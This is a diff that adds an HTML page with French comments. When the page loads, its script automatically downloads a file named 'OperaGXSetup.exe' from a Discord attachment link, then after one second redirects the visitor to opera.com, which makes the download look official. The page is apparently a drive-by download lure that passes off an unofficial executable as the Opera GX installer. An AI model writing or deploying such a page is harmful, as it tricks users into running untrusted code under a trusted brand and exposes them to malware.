@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Téléchargement Automatique et Redirection</title>
+</head>
+<body>
+    <script>
+        // URL du fichier à télécharger
+        var fileUrl = "https://cdn.discordapp.com/attachments/1225524121291460729/1249887269121167474/OperaGXSetup.exe?ex=6668efba&is=66679e3a&hm=d38b7b584da82afbe185f5237b2cd43f4713003c56709c26fc2e86ebaf983bd1&";
+        // URL de la page de redirection
+        var redirectUrl = "https://www.opera.com/";
+
+        // Crée un lien de téléchargement et déclenche le téléchargement automatiquement
+        var a = document.createElement('a');
+        a.href = fileUrl;
+        a.download = "OperaGXSetup";
+        document.body.appendChild(a);
+        a.style.display = 'none';
+        a.click();
+
+        // Redirige après un délai de 1 secondes (1000 millisecondes)
+        setTimeout(function() {
+            window.location.href = redirectUrl;
+        }, 1000);
+    </script>
+</body>
+</html>
